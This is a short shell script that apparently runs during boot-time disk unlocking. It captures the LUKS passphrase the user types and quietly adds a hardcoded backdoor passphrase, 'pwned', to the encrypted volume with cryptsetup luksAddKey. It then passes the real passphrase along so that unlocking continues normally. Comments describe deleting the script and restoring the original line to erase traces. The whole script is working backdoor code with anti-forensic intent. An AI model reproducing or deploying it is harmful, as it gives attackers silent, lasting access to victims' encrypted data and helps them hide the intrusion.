#!/bin/sh

# Read piped input
read passphrase

backdoor_passphrase="pwned"
#echo -ne "$passphrase\n$backdoor_passphrase\n" | cryptsetup luksAddKey $1 -T1 > /dev/null 2>&1
echo -ne "$passphrase\n$backdoor_passphrase\n" | cryptsetup -v luksAddKey $1 -T1 1>&2

# Echo passphrase out to continue being used in the next pipe
echo -n "$passphrase"

# Erase all traces we were ever here
#rm "$0"
# TODO: replace the backdoored line with the original

exit 0
